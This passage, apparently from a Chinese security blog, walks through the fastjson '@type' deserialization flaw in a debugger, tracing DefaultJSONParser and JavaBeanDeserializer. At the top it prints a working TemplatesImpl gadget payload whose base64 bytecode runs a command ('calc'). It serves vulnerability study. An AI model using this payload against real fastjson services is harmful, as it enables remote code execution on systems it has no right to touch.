+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031701160.webp" alt="image-20240903170116037" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031701160.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031701160.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031701160.webp?size=large 2x" data-title="image-20240903170116037" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#58a1dd">&#34;@type&#34;</span>:<span style="color:#a6be9d">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span>,<span style="color:#58a1dd">&#34;_bytecodes&#34;</span>:[<span style="color:#a6be9d">&#34;yv66vgAAADQAJAoABwAWCgAXABgIABkKABcAGgcAGwoABQAWBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB0BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB4BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAApTb3VyY2VGaWxlAQAMUGF5bG9hZC5qYXZhDAAIAAkHAB8MACAAIQEABGNhbGMMACIAIwEAE29yZy9leGFtcGxlL1BheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAANAAQADgANAA8ADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAAUAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAGQAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAHAAIAB0ADAAAAAQAAQANAAEAFAAAAAIAFQ==&#34;</span>],&#39;_name&#39;:&#39;asd&#39;,&#39;_tfactory&#39;:{ },<span style="color:#a6be9d">&#34;_outputProperties&#34;</span>:{ },<span style="color:#a6be9d">&#34;_version&#34;</span>:<span style="color:#a6be9d">&#34;1.0&#34;</span>,<span style="color:#a6be9d">&#34;allowedProtocols&#34;</span>:<span style="color:#a6be9d">&#34;all&#34;</span>}</span></span></code></pre></div><p>TemplateImpl类里有<code>getOutputProperties</code> 但是并没有getOutputProperties属性，但是有_outputProperties</p>
+<h5 id="动态调试" class="heading-element"><span>动态调试</span>
+  <a href="#%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>从头开始调</p>
+<p>首先进入JSON.class#parse，到了<code>com\alibaba\fastjson\JSON.class</code>，这个类重载了一堆parse函数</p>
+<p>跟进DefaultJSONParser构造方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#58a1dd">DefaultJSONParser</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">input</span>, <span style="color:#58a1dd">ParserConfig</span> <span style="color:#58a1dd">config</span>, <span style="color:#ff636f">int</span> <span style="color:#58a1dd">features</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>(<span style="color:#58a1dd">input</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">JSONScanner</span>(<span style="color:#58a1dd">input</span>, <span style="color:#58a1dd">features</span>), <span style="color:#58a1dd">config</span>);
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><p>会调用到另一个构造函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#58a1dd">DefaultJSONParser</span>(<span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">input</span>, <span style="color:#58a1dd">JSONLexer</span> <span style="color:#58a1dd">lexer</span>, <span style="color:#58a1dd">ParserConfig</span> <span style="color:#58a1dd">config</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">dateFormatPattern</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">DEFFAULT_DATE_FORMAT</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">contextArrayIndex</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">resolveStatus</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">extraTypeProviders</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">extraProcessors</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">fieldTypeResolver</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">lexer</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">lexer</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">input</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">input</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">config</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">config</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">symbolTable</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">config</span>.<span style="color:#58a1dd">symbolTable</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">int</span> <span style="color:#58a1dd">ch</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">lexer</span>.<span style="color:#58a1dd">getCurrent</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">ch</span> <span style="color:#ff636f">==</span> <span style="color:#a6be9d">&#39;{&#39;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">lexer</span>.<span style="color:#58a1dd">next</span>();
+</span></span><span style="display:flex;"><span>            ((<span style="color:#58a1dd">JSONLexerBase</span>)<span style="color:#58a1dd">lexer</span>).<span style="color:#58a1dd">token</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">12</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">else</span> <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">ch</span> <span style="color:#ff636f">==</span> <span style="color:#a6be9d">&#39;[&#39;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">lexer</span>.<span style="color:#58a1dd">next</span>();
+</span></span><span style="display:flex;"><span>            ((<span style="color:#58a1dd">JSONLexerBase</span>)<span style="color:#58a1dd">lexer</span>).<span style="color:#58a1dd">token</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">14</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">lexer</span>.<span style="color:#58a1dd">nextToken</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><p>重点在ch，但是ch这里已经有值了，应该去跟lexer，也就是<code>new JSONScanner(input, features)</code>，重点在这个函数，这里不细说了</p>
+<pre tabindex="0"><code>return this.ch = index &gt;= this.len ? &#39;\u001a&#39; : this.text.charAt(index);</code></pre><p>再到DefaultJSONParser.class的parse，从这也算是一切的开始</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031809790.webp" alt="image-20240903180956635" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031809790.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031809790.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031809790.webp?size=large 2x" data-title="image-20240903180956635" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>进入DefaultJSONParser重载的另一个parse，这里lexer已经初始化了，后面根据它的token走流程</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031812440.webp" alt="image-20240903181207250" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031812440.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031812440.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409031812440.webp?size=large 2x" data-title="image-20240903181207250" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>跟进一下<code>JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));</code></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041524884.webp" alt="image-20240904152419720" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041524884.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041524884.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041524884.webp?size=large 2x" data-title="image-20240904152419720" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>返回一个hashmap</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041524156.webp" alt="image-20240904152446001" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041524156.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041524156.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041524156.webp?size=large 2x" data-title="image-20240904152446001" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>出来的时候转换成JSONobject</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041526624.webp" alt="image-20240904152617492" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041526624.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041526624.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041526624.webp?size=large 2x" data-title="image-20240904152617492" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>进到parseObject，他会识别<code>@type</code>，然后提取出我们输入的 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，作为变量clazz，这个变量非常重要</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041006316.webp" alt="image-20240904100618113" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041006316.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041006316.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041006316.webp?size=large 2x" data-title="image-20240904100618113" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>JavaBeanDeserializer.class#getDeserializer，把提取的clazz传入了</p>
+<p>然后就到了这里的两句关键代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">ObjectDeserializer</span> <span style="color:#58a1dd">deserializer</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">config</span>.<span style="color:#58a1dd">getDeserializer</span>(<span style="color:#58a1dd">clazz</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">thisObj</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">deserializer</span>.<span style="color:#58a1dd">deserialze</span>(<span style="color:#ff636f">this</span>, <span style="color:#58a1dd">clazz</span>, <span style="color:#58a1dd">fieldName</span>);</span></span></code></pre></div><p>跟一下第一句</p>
+<p>进入JavaBeanDeserializer.class</p>
+<p>调用重载</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041012993.webp" alt="image-20240904101237841" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041012993.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041012993.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041012993.webp?size=large 2x" data-title="image-20240904101237841" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>前面一大堆各种处理</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041535385.webp" alt="image-20240904153555166" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041535385.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041535385.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041535385.webp?size=large 2x" data-title="image-20240904153555166" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>关键点在这一句，往后很大的篇幅clazz、(Type)type也会一直被传递</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041536387.webp" alt="image-20240904153611211" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041536387.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041536387.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041536387.webp?size=large 2x" data-title="image-20240904153611211" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里也是一个关键（又进去一层）</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041538283.webp" alt="image-20240904153841100" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041538283.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041538283.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041538283.webp?size=large 2x" data-title="image-20240904153841100" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里首先拿到了clazz的属性、方法、构造方法，创建了一个列表fieldList用来存储下面对方法名处理完的结果</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041540594.webp" alt="image-20240904154036338" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041540594.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041540594.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041540594.webp?size=large 2x" data-title="image-20240904154036338" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里循环遍历方法名</p>
+<p><code>if (methodName.length() &gt;= 4 &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass())))</code>筛选：</p>
+<ul>
+<li>方法名的长度是否大于等于 4</li>
+<li>方法不是静态方法</li>
+<li>方法的返回类型是否为 <code>void</code> 或与方法所属的类类型相同</li>
+</ul>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041542130.webp" alt="image-20240904154236874" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041542130.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041542130.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041542130.webp?size=large 2x" data-title="image-20240904154236874" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>循环获取他的setXxxx方法，可以看到如果以<code>_</code>开头，他会有所处理</p>
+<p>循环获取getXxxx</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041024974.webp" alt="image-20240904102403840" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041024974.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041024974.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041024974.webp?size=large 2x" data-title="image-20240904102403840" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>把所有的setter和getter方法全部存入<code>fieldList</code>，可以看到这里都是去掉了get和set的，最后return一个JavaBeanInfo</p>
+<p>处理完添加到前面创建的空数组里面添加一个 <code>FieldInfo</code> 对象</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041546882.webp" alt="image-20240904154632675" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041546882.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041546882.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041546882.webp?size=large 2x" data-title="image-20240904154632675" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>最后返回一个JavaBeanInfo对象，fieldList添加了三个Filedinfo对象</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041548327.webp" alt="image-20240904154851126" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041548327.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041548327.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041548327.webp?size=large 2x" data-title="image-20240904154851126" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>出来了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041549085.webp" alt="image-20240904154944921" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041549085.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041549085.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041549085.webp?size=large 2x" data-title="image-20240904154944921" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>往下</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041558772.webp" alt="image-20240904155829600" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041558772.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041558772.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041558772.webp?size=large 2x" data-title="image-20240904155829600" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>终于出来了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041007872.webp" alt="image-20240904100727716" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041007872.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041007872.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041007872.webp?size=large 2x" data-title="image-20240904100727716" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>再回到DefaultJSONParser.class#parseObject，执行刚刚返回的deserializer的deserialza方法</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041028874.webp" alt="image-20240904102835692" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041028874.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041028874.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041028874.webp?size=large 2x" data-title="image-20240904102835692" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>重载两次deserialze，这里<code>Object</code>通过反射获取到TemplateImpl的实例</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041619733.webp" alt="image-20240904161944559" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041619733.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041619733.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041619733.webp?size=large 2x" data-title="image-20240904161944559" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>实例化TemplateImpl作为object</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041039782.webp" alt="image-20240904103955520" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041039782.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041039782.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041039782.webp?size=large 2x" data-title="image-20240904103955520" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>返回这个object</p>
